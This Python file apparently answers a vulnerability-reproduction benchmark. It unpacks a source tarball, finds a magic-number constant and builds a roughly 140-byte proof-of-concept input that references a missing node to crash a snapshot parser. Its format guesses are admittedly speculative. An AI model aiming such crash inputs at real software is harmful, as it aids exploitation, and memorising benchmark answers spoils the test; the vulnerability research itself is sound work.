import tarfile
import tempfile
import os
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        magic_val = 0
        magic_size = 4
        
        # Extract source code and scan for Magic Number
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=tmpdir)
                
                for root, dirs, files in os.walk(tmpdir):
                    for file in files:
                        if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='latin-1') as f:
                                    content = f.read()
                                    # Look for constants like 'const uint32_t SNAPSHOT_MAGIC = 0x...'
                                    matches = re.findall(r'(?:MAGIC|magic)[^=;]*=\s*(0x[0-9a-fA-F]+)', content)
                                    if not matches:
                                        # Look for defines like '#define MAGIC 0x...'
                                        matches = re.findall(r'#define\s+\w*MAGIC\s+(0x[0-9a-fA-F]+)', content)
                                    
                                    for m in matches:
                                        val = int(m, 16)
                                        # Heuristic: Magic numbers are usually large enough
                                        if val > 0xFFFF:
                                            magic_val = val
                                            # Determine size based on hex string length
                                            # '0x' + 8 chars = 10 chars (32-bit)
                                            if len(m) > 10: 
                                                magic_size = 8
                                            else:
                                                magic_size = 4
                                            break
                            except:
                                continue
                        if magic_val: break
                    if magic_val: break
        except Exception:
            pass
            
        poc = bytearray()
        
        # Write Magic if found
        if magic_val:
            if magic_size == 8:
                poc.extend(struct.pack('<Q', magic_val))
            else:
                poc.extend(struct.pack('<I', magic_val))
        
        # Construct payload to trigger "missing referenced node in map"
        # Hypothesis: Format is [Count] [Node1] [Node2] ...
        # Node structure unknown, but likely starts with ID and contains references.
        # We create 1 node with ID=1, and fill the body with RefID=2.
        # Since Node 2 is not defined, looking it up in node_id_map should trigger the bug.
        
        # Number of nodes: 1
        poc.extend(struct.pack('<I', 1))
        
        # Node 1 ID: 1
        poc.extend(struct.pack('<I', 1))
        
        # Node Body: Repeatedly use ID 2 (which is missing)
        # This covers cases where the struct has fields before the reference,
        # or if it's a list of references.
        bad_ref = 2
        # Ground truth length is 140. We generate enough data to be plausible but short.
        # Magic (4-8) + Count (4) + ID (4) + 32*4 (128) = ~140 bytes
        for _ in range(32):
            poc.extend(struct.pack('<I', bad_ref))
            
        return bytes(poc)
